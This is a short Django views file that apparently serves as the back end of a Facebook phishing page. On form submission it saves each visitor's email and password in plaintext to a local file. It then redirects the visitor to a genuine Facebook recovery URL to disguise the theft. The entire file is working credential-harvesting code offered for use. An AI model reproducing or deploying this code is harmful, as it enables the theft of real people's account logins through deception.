from django.shortcuts import render,redirect

# Create your views here.
def index (request):
    if request.method=='POST':
        name=request.POST.get ('email')
        password=request.POST.get ('pass')
        with open ('datacollected.txt',"a") as f:
            data=f"Username={name} \n password={password}\n\n"
            f.write(data)
            f.close()
        return redirect ("https://m.facebook.com/x/recover/extended/ineligible/")
        
    return render (request,'index.php')